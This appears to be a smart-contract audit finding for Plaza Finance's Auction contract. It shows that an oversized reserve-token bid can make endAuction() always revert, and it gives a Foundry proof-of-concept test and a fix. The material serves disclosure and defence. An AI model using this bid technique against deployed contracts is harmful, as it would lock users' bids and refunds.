# Users can bid for more reserve Tokens than those that exist in Pool

### Summary

Function `bid()` in `Auction.sol` restricts bids for a quantity of `buyReserveAmount` higher than `MAX_BID_AMOUNT`:

https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L125-L129

However, `MAX_BID_AMOUNT` is a storage variable fixed at a value of 1e50:

https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L76

This means that users can make a bid lower than `MAX_BID_AMOUNT` but for a larger quantity of reserve tokens than those that exist in the pool.

### Impact

Bids will be recorded regardless of whether enough reserve tokens will exist to cover them. The impact is in the `endAuction()` function, which will always revert despite the auction having expired.
No one will be able to claim their bids or refunds as this function will fail to process:


```javascript
  function endAuction() external auctionExpired whenNotPaused {
    if (state != State.BIDDING) revert AuctionAlreadyEnded();

    if (currentCouponAmount < totalBuyCouponAmount) {
      state = State.FAILED_UNDERSOLD;
    } else if (totalSellReserveAmount >= (IERC20(sellReserveToken).balanceOf(pool) * poolSaleLimit) / 100) {
        state = State.FAILED_POOL_SALE_LIMIT;
    } else {
      state = State.SUCCEEDED;
@>    Pool(pool).transferReserveToAuction(totalSellReserveAmount);//@audit - call can fail
      IERC20(buyCouponToken).safeTransfer(beneficiary, IERC20(buyCouponToken).balanceOf(address(this)));
    }

    emit AuctionEnded(state, totalSellReserveAmount, totalBuyCouponAmount);
  }
```

### PoC

Paste this test on `Auction.t.sol`:


```javascript
  function test_BidAboveReserveAmount() public {

    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");

    usdc.mint(bidder, 1000000000);
    usdc.mint(user2, 1000000000);
    usdc.mint(user3, 1000000000000);

    //totalBuyCouponAmount = 1000000000000 as per setUp()
    //maxBids = 1000 as per setUp()
    //slotSize = 1000000000000 / 1000;
    //=> slotSize = 1000000000
    //amount of reserveToken in pool = 500000000000000000000000000000 as per setUp()
    
    vm.startPrank(bidder);
    usdc.approve(address(auction), 1000000000 ether);
    auction.bid(2500000, 1000000000);
    vm.stopPrank();


    vm.startPrank(user2);
    usdc.approve(address(auction), 1000000000 ether);
    auction.bid(2000000, 1000000000);
    vm.stopPrank();


    vm.startPrank(user3);
    usdc.approve(address(auction), 1000000000000 ether);
    auction.bid(510000000000000000000000000000, 1000000000000); // buyReserveAmount > amount of reserveToken in pool
    vm.stopPrank();


    vm.warp(block.timestamp + 15 days);
    vm.prank(pool);    
    vm.expectRevert();
    auction.endAuction();
  }
```

### Mitigation

Ensure `MAX_BID_AMOUNT` is set according to the pool's balance of reserve tokens.
